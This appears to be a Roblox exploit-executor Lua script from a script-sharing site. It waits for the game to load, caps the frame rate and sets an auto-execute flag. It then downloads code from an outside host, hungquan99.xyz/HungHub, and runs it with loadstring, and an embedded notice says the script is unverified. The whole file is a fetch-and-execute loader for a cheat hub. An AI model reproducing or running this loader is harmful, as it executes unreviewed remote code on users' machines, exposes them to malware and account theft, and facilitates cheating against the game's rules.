repeat task.wait() until game:IsLoaded()
repeat task.wait() until game.Players.LocalPlayer
repeat task.wait() until game.Players.LocalPlayer.Character

task.wait()

setfpscap(15)

--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
getgenv().AutoExecute = true
(loadstring or load)(request({
    Url = "https://hungquan99.xyz/HungHub",
    Method = "GET",
    Headers = {
        ["IsExploit"] = "true"
    }
}).Body)()
